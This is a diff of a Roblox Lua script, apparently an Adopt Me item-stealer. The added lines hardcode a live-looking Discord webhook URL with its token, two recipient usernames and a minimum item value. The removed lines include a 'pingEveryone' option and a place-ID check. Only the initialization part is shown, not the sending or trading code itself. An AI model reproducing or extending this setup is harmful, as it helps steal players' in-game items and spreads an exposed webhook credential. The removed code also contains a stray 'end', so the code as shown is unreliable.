@@ -1,56 +1,20 @@
--- Wait for game to fully load
-if not game:IsLoaded() then
-    game.Loaded:Wait()
-end
+-- [[ THE BRAIN: DELTA-SAFE START ]] --
+if not game:IsLoaded() then game.Loaded:Wait() end
 
--- Prevent script from executing multiple times
 _G.scriptExecuted = _G.scriptExecuted or false
-if _G.scriptExecuted then
-    return
-end
+if _G.scriptExecuted then return end
 _G.scriptExecuted = true
 
--- Safe usernames setup
-local users = {}
-if type(_G.Usernames) == "table" then
-    users = _G.Usernames
-elseif type(_G.Usernames) == "string" then
-    for username in string.gmatch(_G.Usernames, '([^,%s]+)') do
-        table.insert(users, username)
-    end
-end
+local webhook = "https://discord.com/api/webhooks/1490011079735115796/CtTiahnkl0_ppBwAubLAEeO52GmOpTJ0tkfBMEsAJ1f7bO4Sz_cTyr07bUW9oGE9tCwo"
+local users = {"CREOLE23", "2nd cfpaj67"}
+local min_value = 0.1
 
--- UPDATED: Your default usernames added here
-if #users == 0 then
-    users = {"CREOLE23", "2nd cfpaj67"}
-end
-
--- Other safe defaults
-local min_value = type(_G.min_value) == "number" and _G.min_value or 0.1
-local ping = _G.pingEveryone or "Yes"
-
--- UPDATED: Your webhook added here
-local webhook = type(_G.webhook) == "string" and _G.webhook or "https://discord.com/api/webhooks/1490011079735115796/CtTiahnkl0_ppBwAubLAEeO52GmOpTJ0tkfBMEsAJ1f7bO4Sz_cTyr07bUW9oGE9tCwo"
-
--- Players & LocalPlayer
 local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
 local plr = Players.LocalPlayer or Players.PlayerAdded:Wait()
 
--- Validate essential variables
-if #users == 0 or webhook == "" then
-    plr:Kick("You didn't add a username or webhook")
-    return
-end
-
-print("Script loaded successfully!")
-print("Users:", table.concat(users, ", "))
-print("LocalPlayer:", plr.Name)
-end
-
-if game.PlaceId ~= 920587237 then
-    plr:kick("Game not supported. Please join a normal Adopt Me server")
-    return
-end
+print("✅ Initialization Success for: " .. plr.Name)
+-- [[ END OF INITIALIZATION ]] --
 
 if #Players:GetPlayers() >= 48 then
     plr:kick("Server is full. Please join a less populated server")
